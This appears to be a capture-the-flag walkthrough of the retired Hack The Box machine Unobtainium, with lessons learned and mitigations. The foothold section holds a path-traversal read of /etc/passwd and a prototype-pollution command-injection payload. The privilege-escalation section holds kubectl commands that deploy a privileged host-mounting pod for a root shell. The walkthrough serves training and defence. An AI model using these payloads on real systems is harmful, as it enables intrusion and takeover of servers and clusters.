---
machine: Unobtainium
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, electron, kubernetes, prototype-pollution, lfi, container-escape]
---

# Unobtainium — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

The site distributes an Electron app that can be unpacked with `asar`. The code reveals an LFI, prototype pollution and command injection in the API. The shell reaches Kubernetes with admin credentials and deploys a malicious pod that mounts the host to obtain root.

## Recon

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- Ports: `22/tcp` SSH, `80/tcp` HTTP and `3000/tcp` Node.js API.
- Services: Web portal, API and local Kubernetes cluster.
- Technologies: Electron, ASAR, Node.js, Kubernetes and Docker.

## Enumeration

- `unobtainium.htb` with an Electron app download.
- API on port 3000.
- `app.asar` containing client code and endpoints.
- Token or kubeconfig with cluster permissions.

## Foothold

Extract the ASAR and review API calls. The LFI reads server files; prototype pollution alters options and command injection runs a shell in the container.

```bash
wget http://unobtainium.htb/download/unobtainium.AppImage
npx asar extract app.asar app
# LFI
curl 'http://unobtainium.htb/api/download?file=../../../../etc/passwd'
# Prototype pollution + command injection in the API
curl -s -X POST http://unobtainium.htb:3000/api/run -H 'Content-Type: application/json' \
  -d '{"__proto__":{"shell":true},"cmd":"id"}'
```

## Lateral movement

The container shell exposes the service token and Kubernetes configuration. With those credentials, enumerate pods, secrets and cluster permissions.

## Privilege escalation

The token allows pod creation. Deploy a privileged pod with `hostPath: /` to mount the node filesystem; from there, access the key or binary needed for root.

```bash
kubectl --token=<TOKEN> --server=https://<API>:6443 get pods
kubectl --token=<TOKEN> --server=https://<API>:6443 apply -f malicious-pod.yaml
kubectl --token=<TOKEN> --server=https://<API>:6443 exec -it pwn -- chroot /host /bin/bash
```

## Evidence

- Extracted ASAR and API endpoints.
- LFI and command execution in the container.
- Privileged pod with host mount and root shell.

## Lessons learned

- An Electron app leaks server logic and endpoints.
- Prototype pollution can enable RCE in Node.js.
- A Kubernetes token that can create pods is equivalent to node root.

## Mitigation and detection

- Do not ship secrets or sensitive logic in the client.
- Validate JSON schemas and freeze prototypes.
- Enforce least-privilege RBAC and forbid privileged or `hostPath` pods.

## References

- [0xdf — Unobtainium](https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html)
- [IppSec — Unobtainium](https://www.youtube.com/watch?v=UgHt_Y3vdNg)
- [Hack The Box — Unobtainium](https://app.hackthebox.com/machines/unobtainium)
